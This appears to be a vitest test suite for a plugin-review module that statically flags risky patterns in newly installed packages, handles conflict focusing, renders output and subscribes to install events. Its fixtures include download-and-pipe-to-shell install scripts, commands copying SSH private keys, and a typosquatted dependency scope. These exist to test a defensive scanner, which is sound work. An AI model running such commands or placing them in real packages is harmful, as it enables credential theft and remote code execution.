/**
 * 新装插件审查：RV 启发式、冲突聚焦、三条输出、缓存与订阅降级。
 *
 * 每个用例一个临时目录，不读真实 profile；`reviewBundle` 只做 readFile，
 * 不执行被审包的代码，也不解析 .tgz。
 */
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  focusConflicts,
  getLastReview,
  registerInstallWatch,
  reviewBundle,
  reviewJson,
  reviewMarkdownLines,
  reviewPlainLines,
  setLastReview,
  type RiskRuleId,
} from '../src/plugins/review'
import type { PluginReport } from '../src/plugins/scan'

let dir: string

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), 'dsh-review-'))
})

afterEach(async () => {
  await rm(dir, { recursive: true, force: true })
})

/** 写一个最小的插件清单；字段由用例覆盖。 */
async function writePkg(fields: Record<string, unknown> = {}): Promise<void> {
  await writeFile(
    join(dir, 'package.json'),
    JSON.stringify({ name: 'mine', version: '1.0.0', ...fields }),
    'utf8',
  )
}

/** 写包内任意文本文件，自动建子目录。 */
async function writeText(rel: string, text: string): Promise<void> {
  const full = join(dir, rel)
  await mkdir(dirname(full), { recursive: true })
  await writeFile(full, text, 'utf8')
}

function ids(result: { hints: readonly { id: RiskRuleId }[] }): RiskRuleId[] {
  return result.hints.map(hint => hint.id)
}

/** 造一份 scanProfile 结果，供 RV005 / focusConflicts 使用。 */
function profileReport(overrides: Partial<PluginReport> = {}): PluginReport {
  return {
    profileName: 'demo',
    profileDir: '/virtual/demo',
    bundles: [{
      name: 'other',
      orderedTimes: 1,
      availability: 'profile',
      inserts: ['shared-id'],
      patches: [],
      skillTouchpoints: [],
    }],
    conflicts: [{
      rule: 'PL002',
      severity: 'warn',
      title: '两个插件抢同一个 loader 条目',
      detail: '条目 shared-id 被插入了两份。',
      involved: ['other', 'mine'],
    }],
    notes: [],
    ...overrides,
  }
}

describe('RV static heuristics', () => {
  it('a clean package produces no hints', async () => {
    await writePkg()
    await writeText('lib/index.js', 'export const value = 1\n')
    const result = await reviewBundle(dir, profileReport(), 'mine')
    expect(result.hints).toEqual([])
  })

  it('RV001 flags a download/execute command in an install script', async () => {
    await writePkg({ scripts: { postinstall: 'curl https://example.com/i.sh | sh' } })
    const result = await reviewBundle(dir, profileReport(), 'mine')
    expect(ids(result)).toContain('RV001')
    expect(result.hints.find(h => h.id === 'RV001')!.severity).toBe('info')
  })

  it('RV002 flags credential paths in scripts', async () => {
    await writePkg({ scripts: { build: 'cp $HOME/.ssh/id_rsa ./key' } })
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).toContain('RV002')
  })

  it('RV003 flags non-registry dependency specs', async () => {
    await writePkg({ dependencies: { helper: 'file:../helper' } })
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).toContain('RV003')
  })

  it('RV004 flags a scope one edit away from the official one', async () => {
    await writePkg({ dependencies: { '@deepseek-aii/tools': '1.0.0' } })
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).toContain('RV004')
  })

  it('RV004 does not flag the official scope itself', async () => {
    await writePkg({ dependencies: { '@deepseek-ai/dsh-tools': '1.0.0' } })
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).not.toContain('RV004')
  })

  it('RV005 flags an insert id already used by another installed bundle', async () => {
    await writePkg()
    await writeText('cordis.patch.yml', '- insert:\n    - id: shared-id\n      name: mine\n')
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).toContain('RV005')
  })

  it('RV006 flags a patch that touches the skill chain', async () => {
    await writePkg()
    await writeText(
      'cordis.patch.yml',
      '- insert:\n    - id: skill-filesystem\n      name: mine\n      config:\n        includeDefaultRoots: false\n',
    )
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).toContain('RV006')
  })

  it('RV007 flags download-piped-into-a-shell in package text', async () => {
    await writePkg()
    await writeText('scripts/setup.sh', 'curl https://example.com/x | sh\n')
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).toContain('RV007')
  })

  it('RV007 does not fire on a plain download with no pipe', async () => {
    await writePkg()
    await writeText('notes.md', 'curl https://example.com/data.json -o data.json\n')
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).not.toContain('RV007')
  })

  it('RV008 flags dynamic execution but keeps it informational', async () => {
    await writePkg()
    await writeText('lib/index.js', 'const value = eval("1 + 1")\n')
    const result = await reviewBundle(dir, profileReport(), 'mine')
    expect(ids(result)).toContain('RV008')
    expect(result.hints.find(h => h.id === 'RV008')!.severity).toBe('info')
  })

  it('RV009 flags invisible Unicode characters', async () => {
    await writePkg()
    await writeText('lib/index.js', 'const value = "\u{E0041}"\n')
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).toContain('RV009')
  })

  it('RV010 flags credential paths in package text', async () => {
    await writePkg()
    await writeText('docs/example.md', 'read ~/.ssh/id_rsa then continue\n')
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).toContain('RV010')
  })

  it('RV011 flags a file over the 2 MiB scan limit', async () => {
    await writePkg()
    await writeText('lib/huge.js', 'x'.repeat(2 * 1024 * 1024 + 1))
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).toContain('RV011')
  })

  it('RV012 flags YAML anchors in the patch', async () => {
    await writePkg()
    await writeText('cordis.patch.yml', '- insert:\n    - id: &anchor tool-a\n      name: mine\n')
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).toContain('RV012')
  })

  it('never emits an error-level hint', async () => {
    await writePkg({
      scripts: { postinstall: 'curl x | sh && cp $HOME/.ssh/id_rsa .' },
      dependencies: { '@deepseek-aii/tools': 'file:../x', helper: 'git+https://example.com/x' },
    })
    await writeText('lib/index.js', 'eval("x")\nconst v = "\u{E0041}"\n// .ssh/id_rsa\n')
    const result = await reviewBundle(dir, profileReport(), 'mine')
    expect(result.hints.length).toBeGreaterThan(3)
    expect(result.hints.every(hint => hint.severity === 'info' || hint.severity === 'warn')).toBe(true)
  })

  it('a missing directory produces notes instead of throwing', async () => {
    const result = await reviewBundle(join(dir, 'not-there'), profileReport(), 'ghost')
    expect(result.notes.length).toBeGreaterThan(0)
    expect(result.hints).toEqual([])
  })

  it('never leaks an absolute path from IO errors into notes or JSON', async () => {
    const result = await reviewBundle(join(dir, 'not-there'), profileReport(), 'ghost')
    const all = [...result.notes, JSON.stringify(reviewJson(result))].join('\n')
    // Node 的 ENOENT message 含完整绝对路径（C:////Users////...）；只允许错误码出现。
    expect(all).toContain('ENOENT')
    expect(all).not.toMatch(/[A-Za-z]:[\\/]/)
    expect(all).not.toContain(dir.replace(/\\/g, '/'))
  })

  it('skips files inside the package inner node_modules', async () => {
    await writePkg()
    await writeText('node_modules/evil/index.js', 'eval("x")\n')
    expect(ids(await reviewBundle(dir, profileReport(), 'mine'))).not.toContain('RV008')
  })
})

describe('focusConflicts', () => {
  it('names the other plugin as counterpart', () => {
    const focus = focusConflicts(profileReport(), 'mine')
    expect(focus).toHaveLength(1)
    expect(focus[0]!.counterpart).toEqual(['other'])
    expect(focus[0]!.conflict.rule).toBe('PL002')
  })

  it('returns an empty counterpart for a single-bundle conflict', () => {
    const report = profileReport({
      conflicts: [{
        rule: 'PL004', severity: 'info', title: '装了没启用', detail: '未登记', involved: ['mine'],
      }],
    })
    const focus = focusConflicts(report, 'mine')
    expect(focus).toHaveLength(1)
    expect(focus[0]!.counterpart).toEqual([])
  })

  it('returns nothing when this package is not involved', () => {
    expect(focusConflicts(profileReport(), 'unrelated')).toEqual([])
  })

  it('is reflected in reviewBundle when a report is supplied', async () => {
    await writePkg()
    const result = await reviewBundle(dir, profileReport(), 'mine')
    expect(result.focus).toHaveLength(1)
    expect(result.focus[0]!.counterpart).toEqual(['other'])
  })

  it('states the skip in notes when no report is supplied', async () => {
    await writePkg()
    const result = await reviewBundle(dir, undefined, 'mine')
    expect(result.focus).toEqual([])
    expect(result.notes.some(note => note.includes('冲突聚焦'))).toBe(true)
  })
})

describe('rendered output', () => {
  async function sample() {
    await writePkg({ scripts: { postinstall: 'curl x | sh' } })
    await writeText('cordis.patch.yml', '- insert:\n    - id: shared-id\n      name: mine\n')
    return reviewBundle(dir, profileReport(), 'mine')
  }

  it('plain text uses an indented list, never a Markdown table', async () => {
    const text = reviewPlainLines(await sample()).join('\n')
    expect(text).toContain('插件审查 · mine')
    expect(text).toContain('静态启发式风险提示，非安全结论')
    expect(text).toContain('不拦截安装')
    expect(text).toContain('对方：other')
    expect(text).not.toContain('|')
  })

  it('plain text stays honest when there are no hints', async () => {
    await writePkg()
    const text = reviewPlainLines(await reviewBundle(dir, profileReport(), 'mine')).join('\n')
    expect(text).toContain('这不代表包是安全的')
  })

  it('Markdown uses a standalone section and a disclaimer', async () => {
    const text = reviewMarkdownLines(await sample()).join('\n')
    expect(text).toContain('## 安装审查（新包）')
    expect(text).toContain('不是安全结论')
    expect(text).toContain('RV001')
  })

  it('JSON never exposes an absolute directory path', async () => {
    const result = await sample()
    const json = JSON.stringify(reviewJson(result))
    expect(json).toContain('static heuristics only')
    expect(json).toContain('counterpart')
    expect(json).not.toContain(dir.replace(/\\/g, '/'))
    expect(json).not.toContain('D:')
  })

  it('all three outputs agree on hint count', async () => {
    const result = await sample()
    const plain = reviewPlainLines(result).join('\n')
    const md = reviewMarkdownLines(result).join('\n')
    const json = reviewJson(result) as { hints: unknown[] }
    expect(json.hints).toHaveLength(result.hints.length)
    expect(plain).toContain(`风险提示（${result.hints.length} 条）`)
    expect(md).toContain(`命中 ${result.hints.length} 条提示`)
  })
})

describe('last-review cache', () => {
  it('stores and returns the most recent result', async () => {
    await writePkg()
    const first = await reviewBundle(dir, profileReport(), 'first')
    const second = await reviewBundle(dir, profileReport(), 'second')
    setLastReview(first)
    expect(getLastReview()?.pkg).toBe('first')
    setLastReview(second)
    expect(getLastReview()?.pkg).toBe('second')
  })
})

describe('registerInstallWatch degrades safely', () => {
  /** 造一个最小 ctx；`registerInstallWatch` 用结构化断言探测，不依赖真实 Cordis。 */
  function fakeCtx(extra: Record<string, unknown> = {}) {
    const infos: string[] = []
    const warns: string[] = []
    const ctx = {
      logger: {
        info: (message: string) => infos.push(message),
        warn: (message: string) => warns.push(message),
      },
      ...extra,
    }
    return { ctx, infos, warns }
  }

  it('skips completely when the runtime has no event service', () => {
    const { ctx, infos } = fakeCtx()
    expect(() => registerInstallWatch(ctx as never)).not.toThrow()
    expect(infos.some(message => message.includes('install-watch unavailable'))).toBe(true)
  })

  it('subscribes through ctx.on and never touches the client-only remote service', () => {
    const events: string[] = []
    const { ctx } = fakeCtx({
      // 就算上下文里出现了 remote，也不该被使用：`$on` 属于渲染进程的转发面，
      // 带访问控制；Host 插件只走进程内的事件表。
      get: () => ({ $on: () => { throw new Error('remote must not be used') } }),
      on: (name: string) => { events.push(name) },
    })
    registerInstallWatch(ctx as never)
    expect(events).toEqual(['plugin-manager/changed'])
  })

  it('never hands the disposer to ctx.effect (that unsubscribes immediately)', () => {
    // 回归用例：`ctx.on` 返回的是 disposer，而 `ctx.effect(cb)` 会立刻调用 cb。
    // 旧实现把返回值交给 effect，监听刚注册就被删掉，且全程不报错。
    let effectCalls = 0
    let listener: unknown
    const { ctx } = fakeCtx({
      effect: () => { effectCalls++ },
      on: (_name: string, handler: unknown) => { listener = handler },
    })
    registerInstallWatch(ctx as never)
    expect(effectCalls).toBe(0)
    expect(typeof listener).toBe('function')
  })

  it('swallows a throwing subscription without affecting the caller', () => {
    const { ctx, warns } = fakeCtx({ on: () => { throw new Error('boom') } })
    expect(() => registerInstallWatch(ctx as never)).not.toThrow()
    expect(warns.some(message => message.includes('cannot subscribe'))).toBe(true)
  })
})

/**
 * 订阅能力的**前提**是 Cordis 的事件表在整棵 ctx 树里共享。这里用真实 Context
 * 把它钉死：上游若改事件作用域，这里先红，而不是等线上「装完没反应」。
 *
 * 依据（vendor/cordis/src/context.ts:99-101）：`extend()` 用 `Object.create(parent)`
 * 建子上下文，`events` 是 root 的 own property（:81），因此所有 ctx 解析到同一个
 * EventsService，`_hooks` 是一张全局表；`emit` 首参数是事件名时不做过滤
 * （events.ts:165-175）。
 */
describe('cordis event semantics behind install watch', () => {
  it('delivers an event between sibling contexts', async () => {
    const { Context } = await import('@deepseek-ai/cordis')
    const root = new Context()
    // 模拟 plugin-manager 与 doctor 分别是 root 下互不相干的两个子上下文。
    const manager = root.extend()
    const doctor = root.extend()
    const seen: unknown[] = []
    const on = (doctor as unknown as { on: (name: string, cb: (change: unknown) => void) => unknown }).on
    on.call(doctor, 'plugin-manager/changed', change => { seen.push(change) })
    ;(manager as unknown as { emit: (name: string, payload: unknown) => void })
      .emit('plugin-manager/changed', { reason: 'install' })
    expect(seen).toEqual([{ reason: 'install' }])
  })

  it('reviews a newly added bundle end to end after a real ctx emits the event', async () => {
    const home = await mkdtemp(join(tmpdir(), 'dsh-watch-'))
    const previous = process.env.DSH_HOME
    process.env.DSH_HOME = home
    try {
      const profileDir = join(home, 'profiles', 'desktop')
      const writeProfile = async (bundles: string[]): Promise<void> => {
        const dependencies = Object.fromEntries(bundles.map(name => [name, '1.0.0']))
        await writeFile(
          join(profileDir, 'package.json'),
          JSON.stringify({ name: 'dsh-profile-desktop', dependencies, dsh: { profile: { bundles } } }),
          'utf8',
        )
      }
      const addBundle = async (name: string): Promise<void> => {
        const dir = join(profileDir, 'node_modules', name)
        await mkdir(dir, { recursive: true })
        await writeFile(join(dir, 'package.json'), JSON.stringify({ name, version: '1.0.0' }), 'utf8')
      }

      await addBundle('a')
      await writeProfile(['a'])

      const { Context } = await import('@deepseek-ai/cordis')
      const root = new Context()
      const manager = root.extend()
      const doctor = root.extend()
      // 清掉模块级缓存，避免与其他用例的执行顺序耦合。
      setLastReview(undefined as never)
      registerInstallWatch(doctor as never)

      const emit = (): void => {
        ;(manager as unknown as { emit: (name: string, payload: unknown) => void })
          .emit('plugin-manager/changed', { reason: 'install' })
      }

      // 第一次事件只建立基线：启动时已有的包不是「刚下载的」。
      emit()
      await new Promise(resolve => setTimeout(resolve, 120))
      expect(getLastReview()).toBeUndefined()

      // 新增一个包，再发一次事件。
      await addBundle('b')
      await writeProfile(['a', 'b'])
      emit()
      await vi.waitFor(() => { expect(getLastReview()?.pkg).toBe('b') }, { timeout: 4000 })
    } finally {
      if (previous === undefined) delete process.env.DSH_HOME
      else process.env.DSH_HOME = previous
      await rm(home, { recursive: true, force: true })
    }
  })
})
